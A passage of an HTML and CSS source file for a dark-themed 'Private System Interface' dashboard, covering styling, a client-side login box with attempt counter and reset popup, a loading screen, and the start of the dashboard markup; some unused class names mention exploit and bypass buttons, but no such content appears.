<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System Interface</title>
  <style>
    /* Global Styles & Variables */
    :root {
      --primary-color: #ff914d; /* Orange */
      --secondary-color: #ffd966; /* Yellow */
      --dark-bg: #1a1a1a;
      --darker-bg: #2a2a2a;
      --light-text: #f9f2dc;
      --dark-text: #1a1a1a;
      --accent-red: #ff4c4c;
      --accent-blue: #4d91ff;
      --accent-green: #4dff78;
      --accent-purple: #914dff;
      --border-color: #ccc;
      --shadow-color-orange: rgba(255, 145, 77, 0.3);
      --shadow-color-yellow: rgba(255, 217, 102, 0.3);
      --font-primary: 'Montserrat', sans-serif;
      --font-mono: 'Courier New', monospace;
      --transition-speed: 0.3s;
    }

    * {
      box-sizing: border-box;
      font-family: var(--font-primary);
      margin: 0;
      padding: 0;
      scroll-behavior: smooth;
    }

    body {
      margin: 0; padding: 0;
      background: var(--dark-bg);
      color: var(--light-text);
      transition: background-color var(--transition-speed), color var(--transition-speed);
      font-family: var(--font-primary);
      overflow: hidden; /* Prevent scrollbars unless specifically needed */
    }

    /* Loading Screen Styles */
    .loading-screen {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background-color: var(--dark-bg);
      color: var(--light-text);
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      z-index: 9999;
      font-size: 1.5em;
      transition: opacity var(--transition-speed) ease-in-out;
    }

    .loading-screen.hidden {
      opacity: 0;
      pointer-events: none;
    }

    .loading-box {
      text-align: center;
      border: 3px solid var(--primary-color);
      border-radius: 15px;
      padding: 30px 50px;
      box-shadow: 0 0 25px var(--primary-color), 0 0 10px var(--secondary-color);
      animation: pulse 1.5s infinite ease-in-out alternate;
      background: rgba(0, 0, 0, 0.5);
    }

    @keyframes pulse {
      0% {
        transform: scale(1);
        box-shadow: 0 0 25px var(--primary-color), 0 0 10px var(--secondary-color);
      }
      100% {
        transform: scale(1.03);
        box-shadow: 0 0 35px var(--primary-color), 0 0 15px var(--secondary-color), 0 0 5px var(--accent-red);
      }
    }

    .loading-stage {
      font-family: var(--font-mono);
      font-weight: bold;
      letter-spacing: 1px;
      text-shadow: 0 0 5px var(--secondary-color);
      margin-bottom: 15px;
      animation: fadeInText var(--transition-speed) forwards;
    }

    @keyframes fadeInText {
      from { opacity: 0; transform: translateY(-10px); }
      to { opacity: 1; transform: translateY(0); }
    }

    /* Notification Container */
    .notification-container {
      position: fixed;
      top: 20px;
      right: 20px;
      z-index: 1000;
      display: flex;
      flex-direction: column;
      gap: 10px;
      max-width: 350px;
    }

    .notification {
      background-color: var(--darker-bg);
      color: var(--light-text);
      padding: 15px 20px;
      border-radius: 10px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.5);
      border: 1px solid var(--accent-blue);
      opacity: 0;
      transform: translateX(100%);
      transition: opacity var(--transition-speed), transform var(--transition-speed);
      animation: slideIn 0.5s forwards;
      font-size: 0.9em;
      word-wrap: break-word;
      border-left: 5px solid var(--accent-blue); /* Default color */
    }

    .notification.error { border-left-color: var(--accent-red); }
    .notification.success { border-left-color: var(--accent-green); }
    .notification.warning { border-left-color: var(--secondary-color); }
    .notification.info { border-left-color: var(--accent-blue); }
    .notification.system { border-left-color: var(--primary-color); }


    @keyframes slideIn {
      to { opacity: 1; transform: translateX(0); }
    }

    @keyframes slideOut {
      from { opacity: 1; transform: translateX(0); }
      to { opacity: 0; transform: translateX(100%); }
    }

    /* Login System Styles */
    body.login-body {
      margin: 0; padding: 0;
      background: #000;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: var(--font-primary);
    }
    
    .login-box {
      background: #000;
      border-radius: 20px;
      border: 3px solid white;
      box-shadow: 0 0 15px white;
      width: 360px;
      padding: 30px 25px;
      text-align: center;
      position: relative;
      transition: border-color var(--transition-speed), box-shadow var(--transition-speed);
    }
    
    .login-box.flashing {
      animation: flashRed 0.4s ease-in-out 2;
    }
    
    @keyframes flashRed {
      0%, 100% { border-color: red; box-shadow: 0 0 15px red; }
      50% { border-color: white; box-shadow: 0 0 5px white; }
    }
    
    .login-box h2 {
      font-size: 1.7em;
      margin-bottom: 20px;
      font-family: var(--font-mono);
      color: var(--primary-color);
      text-shadow: 0 0 5px var(--secondary-color);
    }
    
    .login-box input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      background: #1c1c1c;
      border: none;
      color: white;
      border-radius: 8px;
      font-size: 1em;
      transition: border-color var(--transition-speed), box-shadow var(--transition-speed);
      outline: none;
    }
    .login-box input:focus {
        border: 1px solid var(--primary-color);
        box-shadow: 0 0 8px var(--primary-color);
    }

    .login-box label {
      display: flex;
      align-items: center;
      font-size: 0.9em;
      margin-bottom: 10px;
      gap: 10px;
      cursor: pointer;
      color: var(--light-text);
    }
    
    #showPassword:checked + span {
      color: red; /* Example styling for checked state */
    }
    
    .login-box button {
      width: 100%;
      padding: 12px;
      background-color: var(--accent-red);
      color: white;
      font-size: 1em;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color var(--transition-speed), transform var(--transition-speed), box-shadow var(--transition-speed);
      outline: none;
      font-weight: bold;
    }
    .login-box button:hover {
      background-color: #e74c3c;
      box-shadow: 0 0 10px var(--accent-red);
      transform: translateY(-2px);
    }
    .login-box button:active {
      transform: translateY(0);
    }
    
    .attempt-counter, .error-message {
      margin-top: 10px;
      font-size: 0.85em;
      color: red;
      font-weight: bold;
    }
    
    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      width: 320px;
      padding: 20px;
      transform: translate(-50%, -50%);
      background: black;
      border: 3px solid white;
      border-radius: 15px;
      box-shadow: 0 0 20px white;
      z-index: 10;
      text-align: center;
    }
    
    .popup p { margin-bottom: 15px; }
    .popup input { margin-bottom: 15px; }
    .popup button { background-color: var(--primary-color); border: none; padding: 10px; border-radius: 5px; cursor: pointer; }
    .popup button:hover { background-color: #ffb67a; }

    /* Dashboard Styles */
    body.dashboard-body {
      font-family: var(--font-primary);
      background-color: var(--dark-bg);
      color: var(--light-text);
      padding: 20px;
      transition: background-color var(--transition-speed), color var(--transition-speed);
      zoom: 1;
      overflow-y: auto; /* Allow scrolling for the dashboard */
    }

    body.dashboard-body.light-theme {
      background-color: var(--secondary-color);
      color: var(--dark-text);
    }

    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: linear-gradient(90deg, var(--primary-color), #ff6f33); /* Gradient */
      padding: 15px 25px;
      border-radius: 12px;
      color: #000;
      margin-bottom: 20px;
      box-shadow: 0 5px 20px rgba(255, 145, 77, 0.4);
      animation: headerGlow 4s infinite alternate;
    }

    @keyframes headerGlow {
      0% { box-shadow: 0 5px 20px rgba(255, 145, 77, 0.4); }
      100% { box-shadow: 0 5px 35px rgba(255, 180, 100, 0.7); }
    }

    body.dashboard-body.light-theme .dashboard-header {
      background: linear-gradient(90deg, var(--secondary-color), #ffc400);
      box-shadow: 0 5px 20px rgba(255, 217, 102, 0.4);
    }
    body.dashboard-body.light-theme .dashboard-header:hover {
       box-shadow: 0 5px 35px rgba(255, 230, 140, 0.7);
    }

    .dashboard-header h1 {
      font-size: 24px;
      font-weight: 700;
      text-shadow: 0 0 8px rgba(0,0,0,0.3);
    }

    .user-info {
      font-weight: bold;
      font-size: 1em;
      color: rgba(0,0,0,0.8);
    }

    .version-box {
      background: var(--secondary-color);
      padding: 8px 15px;
      border-radius: 8px;
      color: #000;
      font-weight: bold;
      font-family: var(--font-mono);
      box-shadow: inset 0 0 5px rgba(0,0,0,0.2);
    }

    .quick-bar {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 30px; /* Increased margin */
      flex-wrap: wrap;
      padding: 10px 0;
      background: rgba(42, 42, 42, 0.3); /* Slightly transparent */
      border-radius: 10px;
      border: 1px solid rgba(255, 145, 77, 0.1);
    }
    body.dashboard-body.light-theme .quick-bar {
      background: rgba(255, 217, 102, 0.3);
      border: 1px solid rgba(255, 145, 77, 0.2);
    }

    .quick-bar button {
      background-color: var(--primary-color);
      border: none;
      padding: 10px 14px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.2s ease; /* Faster transition */
      min-width: 110px;
      white-space: nowrap;
      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
      font-size: 0.9em;
    }

    .quick-bar button:hover {
      background-color: #ffb67a;
      transform: translateY(-2px) scale(1.02);
      box-shadow: 0 4px 15px rgba(255, 145, 77, 0.5);
    }
    .quick-bar button:active {
      transform: translateY(0) scale(1);
      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
    }

    #panicBtn {
      background: var(--accent-red) !important;
      color: white !important;
      animation: blinkRed 2s infinite;
    }
    @keyframes blinkRed {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.6; }
    }

    .announcement-bar {
      width: 100%;
      background-color: var(--primary-color);
      color: black;
      font-weight: bold;
      padding: 10px 0;
      overflow: hidden;
      position: relative;
      border-radius: 8px;
      box-sizing: border-box;
      margin-bottom: 20px;
      user-select: none;
      height: 30px;
      line-height: 13px; /* Vertically center text */
      box-shadow: 0 0 10px var(--primary-color);
      animation: borderGlowOrange 3s infinite alternate;
    }

    @keyframes borderGlowOrange {
      0% { border-color: var(--primary-color); }
      100% { border-color: #ffc400; }
    }

    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 15s linear infinite;
      padding-left: 100%; /* Start off-screen */
      font-size: 1.1em;
      text-shadow: 0 0 5px var(--secondary-color);
    }

    @keyframes scrollLeft {
      0% {
        transform: translateX(0%);
      }
      100% {
        transform: translateX(-100%);
      }
    }

    body.dashboard-body.light-theme .announcement-bar {
      background-color: var(--secondary-color);
      color: #000;
      box-shadow: 0 0 10px var(--secondary-color);
    }

    .main-row {
      display: flex;
      gap: 20px;
      margin-bottom: 20px;
      flex-wrap: wrap;
      justify-content: center; /* Center boxes if they don't fill the row */
    }

    .box {
      background-color: var(--darker-bg);
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 15px var(--shadow-color-orange);
      min-height: 120px;
      transition: all var(--transition-speed) ease;
      flex: 1 1 300px; /* Responsive flex basis */
      display: flex;
      flex-direction: column;
      justify-content: space-between; /* Push content to top/bottom */
    }

    body.dashboard-body.light-theme .box {
      background-color: var(--secondary-color);
      color: var(--dark-text);
      box-shadow: 0 0 15px var(--shadow-color-yellow);
    }

    .box h2 {
      font-size: 18px;
      margin-bottom: 10px;
      color: var(--primary-color);
      font-weight: 700;
      text-shadow: 0 0 5px rgba(255, 145, 77, 0.5);
    }

    body.dashboard-body.light-theme .box h2 {
      color: #994d00;
      text-shadow: 0 0 5px rgba(153, 77, 0, 0.5);
    }

    .box p, .box ul {
      font-size: 14px;
      line-height: 1.5;
    }

    .box:hover {
      transform: translateY(-5px);
      box-shadow: 0 10px 25px var(--shadow-color-orange);
    }
    body.dashboard-body.light-theme .box:hover {
      box-shadow: 0 10px 25px var(--shadow-color-yellow);
    }

    .update-entry {
      background: #40210f;
      padding: 8px;
      margin-top: 5px;
      border-radius: 6px;
      color: var(--light-text);
      font-size: 0.9em;
      animation: updateGlow 5s infinite ease-in-out alternate;
    }
    @keyframes updateGlow {
        0% { background-color: #40210f; }
        50% { background-color: #5a2e1a; }
        100% { background-color: #40210f; }
    }

    body.dashboard-body.light-theme .update-entry {
      background: #ffd999;
      color: #994d00;
    }
    body.dashboard-body.light-theme .update-entry:hover {
       background: #ffebcc;
    }

    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 5px;
      margin-top: 10px;
      text-align: center;
      font-size: 12px;
    }

    .calendar div {
      padding: 6px;
      background: var(--darker-bg); /* Use base dark background */
      border-radius: 4px;
      transition: background-color var(--transition-speed);
      cursor: default;
    }
    .calendar div:not(.today):not(.calendar-header-day):hover {
        background: #3a3a3a; /* Slightly lighter on hover */
    }

    .calendar-header-day { /* For day names */
      font-weight: bold;
      color: var(--primary-color);
      background: rgba(255, 145, 77, 0.1) !important; /* Subtle accent */
    }

    .today {
      background: var(--accent-red) !important;
      font-weight: bold;
      color: white;
      animation: pulseRed 1.5s infinite;
    }

    body.dashboard-body.light-theme .calendar div {
      background: var(--secondary-color);
      color: var(--dark-text);
    }
     body.dashboard-body.light-theme .calendar div:not(.today):not(.calendar-header-day):hover {
        background: #fff3cc;
    }

    body.dashboard-body.light-theme .today {
      background: #994d00 !important;
      color: var(--secondary-color);
    }

    @keyframes pulseRed {
        0% { transform: scale(1); }
        50% { transform: scale(1.05); }
        100% { transform: scale(1); }
    }


    #canvasContainer {
      display: none;
      margin-top: 20px;
      text-align: center;
      animation: fadeIn 0.5s forwards;
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    #notesCanvas {
      border: 2px solid var(--primary-color);
      border-radius: 12px;
      background: #fff; /* White canvas background */
      cursor: crosshair;
      touch-action: none;
      box-shadow: 0 0 20px rgba(255, 145, 77, 0.5);
      max-width: 100%; /* Ensure responsiveness */
      height: auto;
    }
    body.dashboard-body.light-theme #notesCanvas {
        border-color: #994d00;
        box-shadow: 0 0 20px rgba(153, 77, 0, 0.5);
    }

    #canvasControls {
      margin-top: 10px;
      display: flex;
      justify-content: center;
      gap: 10px;
    }

    #canvasControls button {
      background-color: var(--primary-color);
      border: none;
      padding: 8px 16px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s ease, transform 0.1s ease;
      margin: 0 5px;
    }

    #canvasControls button:hover {
      background-color: #ffb67a;
      transform: translateY(-2px);
    }
    #canvasControls button:active {
      transform: translateY(0);
    }

    .motivation-box {
      background-color: var(--darker-bg);
      color: var(--secondary-color);
      padding: 20px;
      border-radius: 12px;
      font-style: italic;
      font-size: 16px;
      box-shadow: 0 0 12px rgba(255, 145, 77, 0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 120px;
      text-align: center;
      flex: 1 1 300px; /* Match box behavior */
    }

    body.dashboard-body.light-theme .motivation-box {
      background-color: #fff3cc;
      color: #994d00;
      box-shadow: 0 0 12px rgba(255, 145, 77, 0.8);
    }

    /* Info Panel Styles */
    .info-panel {
      display: none; /* Hidden by default */
      background-color: var(--darker-bg);
      padding: 20px;
      border-radius: 12px;
      margin-top: 20px;
      box-shadow: 0 0 15px var(--shadow-color-orange);
      animation: slideFadeIn 0.5s forwards;
      border: 1px solid rgba(255, 145, 77, 0.2);
    }
    body.dashboard-body.light-theme .info-panel {
      background-color: var(--secondary-color);
      color: var(--dark-text);
      border: 1px solid rgba(255, 145, 77, 0.3);
    }

    .info-panel h2 {
      color: var(--primary-color);
      margin-bottom: 15px;
      text-align: center;
      font-size: 1.6em;
      font-weight: 700;
      text-shadow: 0 0 5px rgba(255, 145, 77, 0.5);
    }

    body.dashboard-body.light-theme .info-panel h2 {
      color: #994d00;
      text-shadow: 0 0 5px rgba(153, 77, 0, 0.5);
    }

    @keyframes slideFadeIn {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
    }

    .wifi-grid, .wifi-entry { /* Re-using for structure */
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 10px;
      margin-bottom: 10px;
    }

    .wifi-grid div, .wifi-entry div {
      padding: 8px;
      background: #333;
      border-radius: 6px;
      text-align: center;
      font-weight: bold;
      font-size: 0.9em;
    }
    body.dashboard-body.light-theme .wifi-grid div,
    body.dashboard-body.light-theme .wifi-entry div {
      background: #ffd999;
      color: #994d00;
    }
    .wifi-entry div { /* Different styling for data rows */
        background: #40210f;
        font-weight: normal;
    }
     body.dashboard-body.light-theme .wifi-entry div {
        background: #ffe8c7;
    }

    .handbook-buttons, .links-list, .exploit-buttons, .bypass-buttons, .ipad-options {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); /* Responsive grid */
      gap: 10px;
      margin-top: 15px;
    }
    .exploit-buttons { grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); }
    .bypass-buttons { grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); }
    .ipad-options { grid-template-columns: repeat(2, 1fr); } /* Specific layout for iPad options */


    .handbook-buttons button,
    .links-list a,
    .exploit-buttons a,
    .bypass-buttons button,
    .ipad-options button {
      background-color: var(--primary-color);
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.2s ease;
      text-decoration: none;
      text-align: center;
      font-size: 0.95em;
      display: inline-block; /* For links */
    }

    .handbook-buttons button:hover,
    .links-list a:hover,
    .exploit-buttons a:hover,
    .bypass-buttons button:hover,
    .ipad-options button:hover {
      background-color: #ffb67a;
      transform: translateY(-2px) scale(1.02);
      box-shadow: 0 4px 15px rgba(255, 145, 77, 0.5);
    }
    .handbook-buttons button:active,
    .links-list a:active,
    .exploit-buttons a:active,
    .bypass-buttons button:active,
    .ipad-options button:active {
      transform: translateY(0) scale(1);
    }

    .coming-soon {
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      text-align: center;
      font-weight: bold;
      color: var(--light-text);
      animation: pulseYellow 4s infinite ease-in-out alternate;
    }
    @keyframes pulseYellow {
        0% { background: #40210f; color: var(--light-text); box-shadow: none; }
        50% { background: #5a2e1a; color: var(--secondary-color); box-shadow: 0 0 15px var(--secondary-color); }
        100% { background: #40210f; color: var(--light-text); box-shadow: none; }
    }

    body.dashboard-body.light-theme .coming-soon {
      background: #ffd999;
      color: #994d00;
    }

    .info-text {
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      font-size: 0.9em;
      line-height: 1.6;
    }

    body.dashboard-body.light-theme .info-text {
      background: #ffd999;
      color: #994d00;
    }

    .school-info-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .school-info-item {
      background: #40210f;
      padding: 12px;
      border-radius: 8px;
      box-shadow: inset 0 0 10px rgba(0,0,0,0.3);
    }

    body.dashboard-body.light-theme .school-info-item {
      background: #ffd999;
    }

    .school-info-label {
      font-weight: bold;
      color: var(--primary-color);
      margin-bottom: 5px;
      display: block; /* Ensure it takes its own line */
    }

    body.dashboard-body.light-theme .school-info-label {
      color: #994d00;
    }

    .ipad-options button {
      flex: 1; /* Make buttons fill available space */
    }

    .ipad-content, .bypass-content {
      display: none;
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      font-size: 0.9em;
      line-height: 1.6;
    }
    
    body.dashboard-body.light-theme .ipad-content,
    body.dashboard-body.light-theme .bypass-content {
      background: #ffd999;
      color: #994d00;
    }

    /* -------- New Dashboard Sections -------- */

    /* System Tools Panel */
    .system-tools-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
      gap: 10px;
    }
    .tool-card {
      background: #303030;
      padding: 15px;
      border-radius: 8px;
      text-align: center;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    .tool-card:hover {
      background: #404040;
      transform: translateY(-3px);
      box-shadow: 0 5px 15px rgba(255, 145, 77, 0.3);
    }
    body.dashboard-body.light-theme .tool-card {
      background: #fff0b3;
      color: #994d00;
    }
    body.dashboard-body.light-theme .tool-card:hover {
      background: #fff8e6;
      box-shadow: 0 5px 15px rgba(255, 217, 102, 0.5);
    }
    .tool-card span { font-size: 0.8em; opacity: 0.8; }

    /* Network Diagnostics Panel */
    .network-input-group {
      display: flex;
      gap: 10px;
      margin-bottom: 15px;
      align-items: center;
    }
    .network-input-group input[type="text"] {
        flex-grow: 1; /* Input takes available space */
        padding: 10px;
        background: #303030;
        border: 1px solid #555;
        border-radius: 5px;
        color: var(--light-text);
        font-size: 0.9em;
    }
    body.dashboard-body.light-theme .network-input-group input[type="text"] {
        background: #fff0b3;
        border: 1px solid #ffcc66;
        color: #994d00;
    }
    .network-results {
      background: #303030;
      padding: 15px;
      border-radius: 8px;
      min-height: 100px;
      font-size: 0.9em;
      overflow-y: auto; /* Scrollable results */
      border: 1px solid var(--accent-blue);
    }
     body.dashboard-body.light-theme .network-results {
        background: #fff0b3;
        border-color: #4d91ff;
        color: #994d00;
    }

    /* Security Alerts Panel */
    .security-log-item {
      padding: 10px;
      margin-bottom: 8px;
      border-bottom: 1px dashed #444;
      font-size: 0.9em;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    body.dashboard-body.light-theme .security-log-item {
      border-bottom: 1px dashed #ddd;
    }
    .security-log-item .timestamp { opacity: 0.7; font-size: 0.8em; margin-left: 15px; }
    .security-log-item.alert { color: var(--accent-red); font-weight: bold; }
    .security-log-item.warning { color: var(--secondary-color); }
    .security-log-item.info { color: var(--accent-blue); }

    /* Process Monitor Panel */
    .process-table {
      width: 100%;
      border-collapse: collapse;
      font-size: 0.85em;
    }
    .process-table th, .process-table td {
      padding: 8px;
      text-align: left;
      border-bottom: 1px solid #3a3a3a;
    }
    body.dashboard-body.light-theme .process-table th,
    body.dashboard-body.light-theme .process-table td {
      border-bottom: 1px solid #e0e0e0;
    }
    .process-table th {
      background: rgba(255, 145, 77, 0.2);
      font-weight: bold;
      color: var(--primary-color);
      border-bottom: 2px solid var(--primary-color);
    }
    body.dashboard-body.light-theme .process-table th {
      background: rgba(255, 217, 102, 0.4);
      color: #994d00;
      border-bottom: 2px solid #994d00;
    }
    .process-table tr:nth-child(even) {
      background: rgba(42, 42, 42, 0.5);
    }
     body.dashboard-body.light-theme .process-table tr:nth-child(even) {
      background: rgba(255, 235, 170, 0.3);
    }
    .process-table .process-name { font-weight: bold; }
    .process-table .cpu-bar, .process-table .mem-bar {
      height: 8px;
      background: #555;
      border-radius: 4px;
      overflow: hidden;
      margin-top: 3px;
    }
    .process-table .cpu-bar div, .process-table .mem-bar div {
      height: 100%;
      background: var(--accent-blue);
    }
    .process-table .mem-bar div { background: var(--accent-purple); }
     body.dashboard-body.light-theme .process-table .cpu-bar div { background: #4d91ff; }
     body.dashboard-body.light-theme .process-table .mem-bar div { background: #914dff; }

    /* File Explorer Panel */
    .file-explorer {
      display: grid;
      grid-template-columns: 1fr 3fr; /* Tree structure */
      gap: 15px;
      height: 300px; /* Fixed height for scrolling */
    }
    .file-tree, .file-view {
      overflow-y: auto;
      padding-right: 10px; /* Padding for scrollbar */
    }
    .file-tree { background: #303030; border-radius: 5px; padding: 10px; }
    .file-view { background: #353535; border-radius: 5px; padding: 10px; }
    body.dashboard-body.light-theme .file-tree { background: #fff0b3; }
    body.dashboard-body.light-theme .file-view { background: #fff8e6; }

    .file-tree ul { list-style: none; padding-left: 20px; }
    .file-tree li {
      margin: 5px 0;
      cursor: pointer;
      transition: color 0.2s;
    }
    .file-tree li:hover { color: var(--primary-color); }
    .file-tree li.selected { color: var(--accent-red); font-weight: bold; }

    .file-view .file-item {
      padding: 10px;
      background: rgba(255,255,255,0.05);
      margin-bottom: 5px;
      border-radius: 3px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 0.9em;
    }
    body.dashboard-body.light-theme .file-view .file-item {
      background: rgba(153,77,0,0.05);
    }
    .file-view .file-item:hover { background: rgba(255,145,77,0.2); }
    body.dashboard-body.light-theme .file-view .file-item:hover { background: rgba(255,180,100,0.2); }

    /* System Logs Panel */
    .log-container {
      height: 300px;
      overflow-y: auto;
      background: #303030;
      border-radius: 5px;
      padding: 10px;
      font-size: 0.85em;
      border: 1px solid #444;
    }
    body.dashboard-body.light-theme .log-container {
      background: #fff0b3;
      border-color: #e0e0e0;
      color: #994d00;
    }
    .log-entry { margin-bottom: 5px; padding: 5px; border-radius: 3px; }
    .log-entry.info { color: var(--accent-blue); }
    .log-entry.warning { color: var(--secondary-color); }
    .log-entry.error { color: var(--accent-red); font-weight: bold; }
    .log-entry.debug { color: #888; }
    .log-entry .timestamp { opacity: 0.7; margin-right: 10px; }

    /* Reminder System Styles */
    .reminder-input-group {
      display: flex;
      gap: 10px;
      margin-bottom: 15px;
    }
    .reminder-input-group input[type="text"] {
      flex-grow: 1;
      padding: 10px;
      background: #303030;
      border: 1px solid #555;
      border-radius: 5px;
      color: var(--light-text);
      font-size: 0.9em;
    }
     body.dashboard-body.light-theme .reminder-input-group input[type="text"] {
        background: #fff0b3;
        border: 1px solid #ffcc66;
        color: #994d00;
    }
    .reminder-input-group button {
      background: var(--primary-color);
      border: none;
      padding: 10px 15px;
      border-radius: 5px;
      cursor: pointer;
      transition: background 0.2s ease;
      font-weight: bold;
    }
    .reminder-input-group button:hover { background: #ffb67a; }

    #reminderList {
      list-style: none;
      padding: 0;
      max-height: 200px; /* Scrollable list */
      overflow-y: auto;
      background: #303030;
      border-radius: 5px;
      padding: 10px;
      border: 1px solid #444;
    }
    body.dashboard-body.light-theme #reminderList {
      background: #fff0b3;
      border-color: #e0e0e0;
    }
    .reminder-item {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px;
      border-bottom: 1px dashed #444;
      font-size: 0.9em;
    }
    body.dashboard-body.light-theme .reminder-item {
      border-bottom: 1px dashed #ddd;
    }
    .reminder-item:last-child { border-bottom: none; }
    .reminder-item.done {
      text-decoration: line-through;
      color: #888;
      opacity: 0.7;
    }
    .reminder-actions button {
      background: none;
      border: none;
      cursor: pointer;
      margin-left: 5px;
      font-size: 1em;
      transition: color 0.2s;
    }
    .reminder-actions .done-btn { color: var(--accent-green); }
    .reminder-actions .delete-btn { color: var(--accent-red); }
    .reminder-actions .done-btn:hover { color: #4dff78; }
    .reminder-actions .delete-btn:hover { color: #ff7070; }

  </style>
  
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
</head>
<body id="bodyElement">

  <!-- Loading Screen -->
  <div id="loadingScreen" class="loading-screen">
      <div class="loading-box">
          <div class="loading-stage" id="stage1">Initializing System...</div>
          <div class="loading-stage" id="stage2" style="display: none;">Key System Active...</div>
          <div class="loading-stage" id="stage3" style="display: none;">Dashboard Ready...</div>
      </div>
  </div>

  <!-- Notification Container -->
  <div id="notificationContainer" class="notification-container">
      <!-- Notifications will be appended here -->
  </div>

  <!-- Main App Container -->
  <div id="appContainer">
    <!-- Login System -->
    <div class="login-box" id="loginBox">
      <h2>𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙎𝙮𝙨𝙩𝙚𝙢</h2>

      <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
      <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
      <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

      <label for="showPassword">
        <input type="checkbox" id="showPassword" />
        <span>Show Password</span>
      </label>

      <button id="submitBtn">Submit</button>

      <div class="error-message" id="errorMsg"></div>
      <div class="attempt-counter" id="attemptsText">Attempts Left: 5</div>

      <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
        <p>Too many failed attempts.</p>
        <input type="password" id="resetField" placeholder="Enter Reset Code..." autocomplete="off" />
        <button id="resetBtn">Reset Counter</button>
      </div>
    </div>

    <!-- Dashboard (hidden by default) -->
    <div id="dashboard" style="display: none;">
      <div class="dashboard-header" id="dashboardHeader">
        <div>
          <h1>Private Dashboard GUI</h1>
          <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
        </div>
        <div class="version-box">Version 1.8.7</div>
      </div>

      <!-- Quick Bar -->
      <div class="quick-bar">
        <button id="sessionTime">⏳ Session Time: 00:00:00</button>
        <button id="realTimeClock">🕒 --:--:--</button>
        <button id="realDate">📅 --</button>
        <button id="notesBtn">📒 Notes</button>
        <button id="exportNotesBtn">💾 Export Notes</button>
        <button id="screenshotBtn">📸 Screenshot</button>
        <button id="toggleSectionsBtn">⬆️ Toggle Sections</button>
        <button id="fixIssuesBtn">🛠️ Fix Issues</button>
        <button id="fullScreenBtn">🖥️ Full Screen</button>
        <button id="zoomInBtn">➕ Zoom In</button>
        <button id="zoomOutBtn">➖ Zoom Out</button>
        <button id="restartBtn">🔄 Restart</button>
        <button id="panicBtn">🚨 Panic Mode</button>
        <button id="themeToggle">🌙 Dark Mode</button>
        <button id="logoutBtn">🔓 Log Out</button>
      </div>

      <!-- Announcement Bar -->
      <div id="announcementBar" class="announcement-bar">
        <span>📢 Security Alert: New system update deployed. Please review recent logs. 📢</span>
      </div>
      
      <!-- Main Dashboard Grid -->
      <div class="main-row" id="mainGrid">
        
        <div class="box">
          <h2>📅 Calendar</h2>
          <div class="calendar" id="calendar">
            <!-- Calendar days will be generated here -->
          </div>
        </div>

        <div class="box motivation-box" id="motivationBox">
          "The future belongs to those who believe in the beauty of their dreams." – Eleanor Roosevelt
        </div>
      </div>

      <!-- Updates & Notifications Section -->
      <div id="updatesNotifications" style="display: flex; gap: 20px; justify-content: center; flex-wrap: wrap; margin-top: 20px;">
        <div class="box" style="flex: 1 1 300px; min-width: 280px;">
          <h2>🔄 System Updates</h2>
          <div class="update-entry">v1.8.7: Enhanced network diagnostics and process monitor UI.</div>
          <div class="update-entry">v1.8.6: Implemented file explorer simulation.</div>
          <div class="update-entry">v1.8.5: Security Center revamped with real-time alerts.</div>
          <div class="update-entry">v1.8.0: Major UI overhaul and new panels added.</div>
          <div class="update-entry">v1.7.2: Reminder system stability improved.</div>
        </div>

        <div class="box" style="flex: 1 1 300px; min-width: 280px;">
          <h2>🔔 Recent Activity</h2>
          <p>User logged in successfully.</p>
          <p>Session timer started.</p>
          <p>Theme switched to Dark Mode.</p>
          <p>Notes panel accessed.</p>
          <p>Calendar displayed.</p>
        </div>
      </div>

      <!-- Quick Action Buttons for Panels -->
      <div class="quick-bar" style="flex-wrap: wrap; margin-top: 30px;">
